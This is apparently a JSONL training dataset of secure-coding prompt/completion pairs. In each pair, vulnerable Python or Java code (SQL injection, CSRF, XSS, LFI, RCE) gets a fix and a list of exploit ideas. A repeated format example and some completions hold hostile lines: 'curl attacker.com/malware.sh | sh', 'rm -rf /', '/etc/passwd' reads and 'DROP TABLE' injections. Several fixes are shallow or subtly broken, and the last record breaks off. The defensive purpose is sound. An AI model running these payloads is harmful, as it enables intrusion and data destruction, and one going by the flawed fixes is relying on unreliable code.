{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Local File Inclusion (LFI) - Limited Scope\n- Vulnerable Code: import os\nfrom flask import Flask, request\ndef read_file(file_path):\n    with open(os.path.join('documents', file_path), 'r') as file:\n        return file.read()\napp = Flask(__name__)\n@app.route('/view')\ndef view():\n    file_name = request.args.get('file')\n    if not file_name or '..' in file_name or '\\\\' in file_name:\n        return 'Invalid file name', 400\n    try:\n        content = read_file(file_name)\n        return content\n    except FileNotFoundError:\n        return 'File not found', 404\n- CVSS Score: 5.3\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"import os\\\\nfrom flask import Flask, request\\\\ndef read_file(file_path):\\\\n    with open(os.path.join('documents', file_path), 'r') as file:\\\\n        return file.read()\\\\napp = Flask(__name__)\\\\n@app.route('/view')\\\\ndef view():\\\\n    file_name = request.args.get('file')\\\\n    if not file_name or '..' in file_name or '\\\\\\\\' in file_name:\\\\n        return 'Invalid file name', 400\\\\n    try:\\\\n        content = read_file(file_name)\\\\n        return content\\\\n    except FileNotFoundError:\\\\n        return 'File not found', 404\", \"vulnerability_type\": \"Local File Inclusion (LFI) - Limited Scope\", \"cvss_score\": 5.3, \"fixed_code\": \"import os\\\\nfrom flask import Flask, request\\\\ndef read_file(file_path):\\\\n    with open(os.path.join('documents', file_path), 'r') as file:\\\\n        return file.read()\\\\napp = Flask(__name__)\\\\nALLOWED_FILES = {'report.txt', 'summary.pdf'}\\\\n@app.route('/view')\\\\ndef view():\\\\n    file_name = request.args.get('file')\\\\n    if not file_name or file_name not in ALLOWED_FILES:\\\\n        return 'Invalid file name', 400\\\\n    try:\\\\n        content = read_file(file_name)\\\\n        return content\\\\n    except FileNotFoundError:\\\\n        return 'File not found', 404\", \"exploit_ways\": [\"An attacker can exploit the code to access files like 'secret.txt' within the 'documents' directory by guessing filenames.\", \"Using '..%2F..%2F..' sequences might still bypass checks if additional filtering isn't in place (though mitigated here).\", \"If file path construction is complex, attackers could use URL-encoded characters to probe and access unintended files.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Cross-Site Request Forgery (CSRF)\n- Vulnerable Code: import javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class TransferServlet extends HttpServlet {\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) {\n        String amount = request.getParameter(\"amount\");\n        String destinationAccount = request.getParameter(\"destinationAccount\");\n        // Simulate transferring money without CSRF protection\n        transferMoney(amount, destinationAccount);\n    }\n\n    private void transferMoney(String amount, String destinationAccount) {\n        // Transfer logic here\n    }\n}\n- CVSS Score: 6.8\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"import javax.servlet.http.HttpServlet;\\\\nimport javax.servlet.http.HttpServletRequest;\\\\nimport javax.servlet.http.HttpServletResponse;\\\\n\\\\npublic class TransferServlet extends HttpServlet {\\\\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) {\\\\n        String amount = request.getParameter(\\\\\\\"amount\\\\\\\");\\\\n        String destinationAccount = request.getParameter(\\\\\\\"destinationAccount\\\\\\\");\\\\n        // Simulate transferring money without CSRF protection\\\\n        transferMoney(amount, destinationAccount);\\\\n    }\\\\n\\\\n    private void transferMoney(String amount, String destinationAccount) {\\\\n        // Transfer logic here\\\\n    }\\\\n}\", \"vulnerability_type\": \"Cross-Site Request Forgery (CSRF)\", \"cvss_score\": 6.8, \"fixed_code\": \"import javax.servlet.http.HttpServlet;\\\\nimport javax.servlet.http.HttpServletRequest;\\\\nimport javax.servlet.http.HttpServletResponse;\\\\nimport java.util.UUID;\\\\n\\\\npublic class TransferServlet extends HttpServlet {\\\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\\\\n        String csrfToken = UUID.randomUUID().toString();\\\\n        request.getSession().setAttribute(\\\\\\\"csrfToken\\\\\\\", csrfToken);\\\\n        // Render form with the CSRF token\\\\n    }\\\\n\\\\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) {\\\\n        String sessionCsrfToken = (String) request.getSession().getAttribute(\\\\\\\"csrfToken\\\\\\\");\\\\n        String requestCsrfToken = request.getParameter(\\\\\\\"csrfToken\\\\\\\");\\\\n\\\\n        if (!sessionCsrfToken.equals(requestCsrfToken)) {\\\\n            throw new SecurityException(\\\\\\\"CSRF Token Validation Failed\\\\\\\");\\\\n        }\\\\n\\\\n        String amount = request.getParameter(\\\\\\\"amount\\\\\\\");\\\\n        String destinationAccount = request.getParameter(\\\\\\\"destinationAccount\\\\\\\");\\\\n        transferMoney(amount, destinationAccount);\\\\n    }\\\\n\\\\n    private void transferMoney(String amount, String destinationAccount) {\\\\n        // Transfer logic here\\\\n    }\\\\n}\", \"exploit_ways\": [\"An attacker can craft a malicious form submission that tricks the victim into transferring funds without their knowledge.\", \"Using social engineering, an attacker can trick users to click on links or visit pages with embedded requests that perform unauthorized actions.\", \"By injecting crafted HTML content in vulnerable applications, attackers can automatically submit forged requests when users browse to the injected page.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Information Disclosure (Low Severity)\n- Vulnerable Code: public class UserInfo {\n    private String sensitiveData;\n\n    public UserInfo(String data) {\n        this.sensitiveData = data;\n    }\n\n    public void displayInfo() {\n        System.out.println(\"Sensitive Data: \" + this.sensitiveData);\n    }\n}\n- CVSS Score: 3.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"public class UserInfo {\\\\n    private String sensitiveData;\\\\n\\\\n    public UserInfo(String data) {\\\\n        this.sensitiveData = data;\\\\n    }\\\\n\\\\n    public void displayInfo() {\\\\n        System.out.println(\\\\\\\"Sensitive Data: \\\\\\\" + this.sensitiveData);\\\\n    }\\\\n}\", \"vulnerability_type\": \"Information Disclosure (Low Severity)\", \"cvss_score\": 3.5, \"fixed_code\": \"public class UserInfo {\\\\n    private String sensitiveData;\\\\n\\\\n    public UserInfo(String data) {\\\\n        this.sensitiveData = data;\\\\n    }\\\\n\\\\n    public void displayInfo() {\\\\n        // Sensitive data should not be logged or printed.\\\\n        System.out.println(\\\\\\\"User information displayed\\\\\\\");\\\\n    }\\\\n}\", \"exploit_ways\": [\"An attacker with access to the output could read sensitive data directly.\", \"If logs are stored, they could contain sensitive user information leading to a data breach.\", \"Sensitive data might be inadvertently exposed in debugging or error messages.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: SQL Injection\n- Vulnerable Code: # Python example\ndef get_user_data(user_id):\n    import sqlite3\n    conn = sqlite3.connect('example.db')\n    cursor = conn.cursor()\n    query = \"SELECT * FROM users WHERE id = \" + user_id\n    cursor.execute(query)\n    return cursor.fetchall()\n- CVSS Score: 7.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"# Python example\\\\ndef get_user_data(user_id):\\\\n    import sqlite3\\\\n    conn = sqlite3.connect('example.db')\\\\n    cursor = conn.cursor()\\\\n    query = \\\\\\\"SELECT * FROM users WHERE id = \\\\\\\" + user_id\\\\n    cursor.execute(query)\\\\n    return cursor.fetchall()\", \"vulnerability_type\": \"SQL Injection\", \"cvss_score\": 7.5, \"fixed_code\": \"# Python example\\\\ndef get_user_data(user_id):\\\\n    import sqlite3\\\\n    conn = sqlite3.connect('example.db')\\\\n    cursor = conn.cursor()\\\\n    query = \\\\\\\"SELECT * FROM users WHERE id = ?\\\\\\\"\\\\n    cursor.execute(query, (user_id,))\\\\n    return cursor.fetchall()\", \"exploit_ways\": [\"An attacker can input '1 OR 1=1' to retrieve all user data.\", \"Using a payload like '1; DROP TABLE users;' could delete the entire users table.\", \"Inputting '1 UNION SELECT username, password FROM admin_table' may expose sensitive admin credentials.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Clickjacking (Low Severity)\n- Vulnerable Code: from flask import Flask, render_template_string\ndef get_hidden_iframe():\n    return '<iframe src=\"https://malicious-site.com\" style=\"position:absolute; top:-100px; left:-100px;\"></iframe>'\napp = Flask(__name__)\n@app.route('/')\ndef index():\n    template = get_hidden_iframe() + \"<h1>Welcome to the site!</h1>\"\n    return render_template_string(template)\nif __name__ == '__main__':\n    app.run(debug=True)\n- CVSS Score: 3.5\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"from flask import Flask, render_template_string\\\\ndef get_hidden_iframe():\\\\n    return '<iframe src=\\\\\\\"https://malicious-site.com\\\\\\\" style=\\\\\\\"position:absolute; top:-100px; left:-100px;\\\\\\\"></iframe>'\\\\napp = Flask(__name__)\\\\n@app.route('/')\\\\ndef index():\\\\n    template = get_hidden_iframe() + \\\\\\\"<h1>Welcome to the site!</h1>\\\\\\\"\\\\n    return render_template_string(template)\\\\nif __name__ == '__main__':\\\\n    app.run(debug=True)\", \"vulnerability_type\": \"Clickjacking (Low Severity)\", \"cvss_score\": 3.5, \"fixed_code\": \"from flask import Flask, render_template_string\\\\napp = Flask(__name__)\\\\n@app.after_request\\\\ndef add_header(response):\\\\n    response.headers['X-Frame-Options'] = 'DENY'\\\\n    return response\\\\n@app.route('/')\\\\ndef index():\\\\n    template = \\\\\\\"<h1>Welcome to the site!</h1>\\\\\\\"\\\\n    return render_template_string(template)\\\\nif __name__ == '__main__':\\\\n    app.run(debug=True)\", \"exploit_ways\": [\"An attacker could overlay a hidden iframe over a legitimate button to trick users into clicking on it without their knowledge.\", \"Users can be manipulated into performing actions on the malicious site while thinking they are interacting with the trusted site.\", \"The malicious site could use the user's interaction to perform unauthorized actions on behalf of the user.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Cross-Site Scripting (XSS)\n- Vulnerable Code: public void printMessage(String userInput) {\n    System.out.println(\"User Input: \" + userInput);\n}\n- CVSS Score: 4.3\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"public void printMessage(String userInput) {\\\\n    System.out.println(\\\\\\\"User Input: \\\\\\\" + userInput);\\\\n}\", \"vulnerability_type\": \"Cross-Site Scripting (XSS)\", \"cvss_score\": 4.3, \"fixed_code\": \"import org.owasp.encoder.Encode;\\\\n\\\\npublic void printMessage(String userInput) {\\\\n    String safeInput = Encode.forHtml(userInput);\\\\n    System.out.println(\\\\\\\"User Input: \\\\\\\" + safeInput);\\\\n}\", \"exploit_ways\": [\"An attacker can inject script tags to execute arbitrary JavaScript in the context of a user's browser.\", \"They could use event handlers like 'onload' or 'onclick' to steal cookies or session tokens from other users.\", \"Injecting malicious scripts could redirect users to phishing sites designed to harvest sensitive information.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Remote Code Execution (RCE)\n- Vulnerable Code: import java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class VulnerableApp {\n    public static void main(String[] args) throws Exception {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\n        System.out.println(\"Enter command: \");\n        String command = reader.readLine();\n        Process process = Runtime.getRuntime().exec(command);\n        BufferedReader output = new BufferedReader(new InputStreamReader(process.getInputStream()));\n        String line;\n        while ((line = output.readLine()) != null) {\n            System.out.println(line);\n        }\n    }\n}\n- CVSS Score: 9.8\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"import java.io.BufferedReader;\\\\nimport java.io.InputStreamReader;\\\\n\\\\npublic class VulnerableApp {\\\\n    public static void main(String[] args) throws Exception {\\\\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\\\\n        System.out.println(\\\\\\\"Enter command: \\\\\\\");\\\\n        String command = reader.readLine();\\\\n        Process process = Runtime.getRuntime().exec(command);\\\\n        BufferedReader output = new BufferedReader(new InputStreamReader(process.getInputStream()));\\\\n        String line;\\\\n        while ((line = output.readLine()) != null) {\\\\n            System.out.println(line);\\\\n        }\\\\n    }\\\\n}\", \"vulnerability_type\": \"Remote Code Execution (RCE)\", \"cvss_score\": 9.8, \"fixed_code\": \"import java.io.BufferedReader;\\\\nimport java.io.InputStreamReader;\\\\n\\\\npublic class SecureApp {\\\\n    public static void main(String[] args) throws Exception {\\\\n        BufferedReader reader = new BufferedReader(new InputStreamReader(System.in));\\\\n        System.out.println(\\\\\\\"Enter command: \\\\\\\");\\\\n        String command = reader.readLine();\\\\n        if (command.equals(\\\\\\\"allowed_command\\\\\\\")) {\\\\n            Process process = Runtime.getRuntime().exec(command);\\\\n            BufferedReader output = new BufferedReader(new InputStreamReader(process.getInputStream()));\\\\n            String line;\\\\n            while ((line = output.readLine()) != null) {\\\\n                System.out.println(line);\\\\n            }\\\\n        } else {\\\\n            System.out.println(\\\\\\\"Command not allowed\\\\\\\");\\\\n        }\\\\n    }\\\\n}\", \"exploit_ways\": [\"User could input 'rm -rf /' to delete system files.\", \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\", \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Local File Inclusion (LFI) - Limited Scope\n- Vulnerable Code: import java.io.BufferedReader;\nimport java.io.FileReader;\nimport java.io.IOException;\nimport javax.servlet.ServletException;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\npublic class FileReadServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String filePath = \"/var/log/\" + request.getParameter(\"log\");\n        try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {\n            String line;\n            while ((line = reader.readLine()) != null) {\n                response.getWriter().println(line);\n            }\n        } catch (IOException e) {\n            response.sendError(HttpServletResponse.SC_NOT_FOUND, \"File not found.\");\n        }\n    }\n}\n- CVSS Score: 5.3\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"import java.io.BufferedReader;\\\\nimport java.io.FileReader;\\\\nimport java.io.IOException;\\\\nimport javax.servlet.ServletException;\\\\nimport javax.servlet.http.HttpServlet;\\\\nimport javax.servlet.http.HttpServletRequest;\\\\nimport javax.servlet.http.HttpServletResponse;\\\\n\\\\npublic class FileReadServlet extends HttpServlet {\\\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\\\\n        String filePath = \\\\\\\"/var/log/\\\\\\\" + request.getParameter(\\\\\\\"log\\\\\\\");\\\\n        try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {\\\\n            String line;\\\\n            while ((line = reader.readLine()) != null) {\\\\n                response.getWriter().println(line);\\\\n            }\\\\n        } catch (IOException e) {\\\\n            response.sendError(HttpServletResponse.SC_NOT_FOUND, \\\\\\\"File not found.\\\\\\\");\\\\n        }\\\\n    }\\\\n}\", \"vulnerability_type\": \"Local File Inclusion (LFI) - Limited Scope\", \"cvss_score\": 5.3, \"fixed_code\": \"import java.io.BufferedReader;\\\\nimport java.io.FileReader;\\\\nimport java.io.IOException;\\\\nimport javax.servlet.ServletException;\\\\nimport javax.servlet.http.HttpServlet;\\\\nimport javax.servlet.http.HttpServletRequest;\\\\nimport javax.servlet.http.HttpServletResponse;\\\\n\\\\npublic class FileReadServlet extends HttpServlet {\\\\n    private static final String LOG_DIR = \\\\\\\"/var/log/\\\\\\\";\\\\n    private static final String[] ALLOWED_FILES = {\\\\\\\"app.log\\\\\\\", \\\\\\\"system.log\\\\\\\", \\\\\\\"error.log\\\\\\\"};\\\\n\\\\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\\\\n        String fileName = request.getParameter(\\\\\\\"log\\\\\\\");\\\\n        if (fileName != null && isValidFile(fileName)) {\\\\n            String filePath = LOG_DIR + fileName;\\\\n            try (BufferedReader reader = new BufferedReader(new FileReader(filePath))) {\\\\n                String line;\\\\n                while ((line = reader.readLine()) != null) {\\\\n                    response.getWriter().println(line);\\\\n                }\\\\n            } catch (IOException e) {\\\\n                response.sendError(HttpServletResponse.SC_NOT_FOUND, \\\\\\\"File not found.\\\\\\\");\\\\n            }\\\\n        } else {\\\\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \\\\\\\"Invalid file name.\\\\\\\");\\\\n        }\\\\n    }\\\\n\\\\n    private boolean isValidFile(String fileName) {\\\\n        for (String allowed : ALLOWED_FILES) {\\\\n            if (allowed.equals(fileName)) {\\\\n                return true;\\\\n            }\\\\n        }\\\\n        return false;\\\\n    }\\\\n}\", \"exploit_ways\": [\"An attacker could request \\\"/etc/passwd\\\" by manipulating the 'log' parameter to read sensitive system files.\", \"The vulnerability allows reading arbitrary log files, potentially leaking sensitive information stored in logs.\", \"Crafting a path traversal attack with '../' sequences might access files outside the intended /var/log directory if not properly mitigated.\"]}"}
{"prompt": "\nGiven the following inputs:\n- Vulnerability Type: Remote Code Execution (RCE)\n- Vulnerable Code: import java.util.Scanner;\\npublic class VulnerableApp {\\n    public static void main(String[] args) throws Exception {\\n        Scanner scanner = new Scanner(System.in);\\n        System.out.println(\"Enter command to execute:\");\\n        String command = scanner.nextLine();\\n        Runtime.getRuntime().exec(command);\\n    }\\n}\n- CVSS Score: 8.2\n\nYour task is to:\n1. Provide a fully secure, fixed version of the vulnerable code.\n2. List 2 to 3 realistic ways the vulnerable code can be exploited or abused.\n\nSTRICT RULES:\n- Output ONLY a valid JSON object.\n- Do NOT add any explanations, markdown, or comments.\n- Escape all double quotes properly.\n- Use the following keys in the final JSON:\n    - \"vulnerability_type\": same as input\n    - \"vulnerability_code\": same as input (escaped)\n    - \"cvss_score\": same as input\n    - \"fixed_code\": remediated and secure version of the code\n    - \"exploit_ways\": a list of 2 or 3 strings, each describing a way the vulnerability could be exploited\n\nJSON FORMAT EXAMPLE:\n{{\n    \"vulnerability_type\": \"Command Injection\",\n    \"vulnerability_code\": \"# Python example\\ndef unsafe():\\n    import os\\n    cmd = input(\\\"Enter command: \\\")\\n    os.system(cmd)\",\n    \"cvss_score\": 8.6,\n    \"fixed_code\": \"# Python example\\ndef safe():\\n    import subprocess\\n    allowed = ['ls', 'whoami']\\n    cmd = input(\\\"Enter command: \\\")\\n    if cmd in allowed:\\n        subprocess.run([cmd])\\n    else:\\n        print(\\\"Not allowed\\\")\",\n    \"exploit_ways\": [\n        \"User could input 'rm -rf /' to delete system files.\",\n        \"Could use 'curl attacker.com/malware.sh | sh' to execute remote malicious code.\",\n        \"Could chain commands like 'ls; cat /etc/passwd' to leak sensitive files.\"\n    ]\n}}\n", "completion": "{\"vulnerability_code\": \"import java.util.Scanner;\\\\npublic class VulnerableApp {\\\\n    public static void main(String[] args) throws Exception {\\\\n        Scanner scanner = new Scanner(System.in);\\\\n        System.out.println(\\\\\\\"Enter command to execute:\\\\\\\");\\\\n        String command = scanner.nextLine();\\\\n        Runtime.getRuntime().exec(command);\\\\n    }\\\\n}\", \"vulnerability_type\": \"Remote Code Execution (RCE)\", \"cvss_score\": 8.2, \"fixed_code\": \"import java.util.Scanner;\\\\npublic class SecureApp {\\\\n    public static void main(String[] args) throws Exception {\\\\n        Scanner scanner = new Scanner(System.in);\\\\n        System.out.println(\\\\\\\"Enter command to execute:\\\\\\\");\\\\n        String command = scanner.nextLine();\\\\n        if (command.equals(\\\\\\\"allowed_command\\\\\\\")) {\\\\n            Runtime.getRuntime().exec(command);\\\\n        } else {\\\\n            System.out.println(\\\\\\\"Command not allowed\\\\\\\");\\\\n        }\\\\n    }\\\\n}\", \"exploit_ways\": [\"User could input 'rm -rf /' to delete system 